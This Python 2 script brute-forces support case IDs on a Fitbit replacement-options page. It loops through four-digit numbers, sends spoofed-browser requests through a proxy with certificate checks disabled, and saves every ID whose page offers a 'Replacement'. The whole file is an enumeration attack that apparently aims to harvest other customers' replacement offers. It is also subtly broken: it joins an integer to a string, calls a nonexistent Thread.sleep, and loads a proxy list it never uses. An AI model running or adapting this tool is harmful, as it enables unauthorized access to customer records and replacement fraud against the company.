# -*- coding: utf-8 -*-
import requests
import re
import Queue
import random
import codecs
from threading import Thread

proxy = '127.0.0.1:8888'
requests.packages.urllib3.disable_warnings()

with codecs.open('Proxies Working.txt', 'r', encoding='utf-8') as f:
	proxies = f.readlines()
def check(q):
	while True:
		try:
			id = q.get()
			prozy = {
				'http': proxy.strip(),
				'https': proxy.strip()
			}
			s = requests.session()
			work = False
			s.cookies.clear()
			headers = {
				'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.97 Safari/537.36',
				'Accept-Encoding': 'gzip',
				'Content-Type': 'application/x-www-form-urlencoded'
			}
			r = s.get(
						'http://fitbit.force.com/service/ReplacementOptions?id=5003300{0}nae&l=en_US&replacement=1&voucher=0'.format(id),
						verify=False,
						proxies=prozy,
						timeout=12,
						headers=headers
					)
			if 'Replacement' in r.text:
				f = open('work.txt', 'a')
				f.write(id+"\n")
				f.close()
			if 'Sorry, the server is busy at the moment' in r.text:
				Thread.sleep(1)
		except Exception, e:
			#print e
			pass
	
def main():
	queue = Queue.Queue()
	
	for _ in range(2):
		worker = Thread(target=check, args=(queue,))
		worker.start()
	jobs = []
	for i in xrange(1111, 9999):
		queue.put(i)
if __name__ == '__main__':
	main()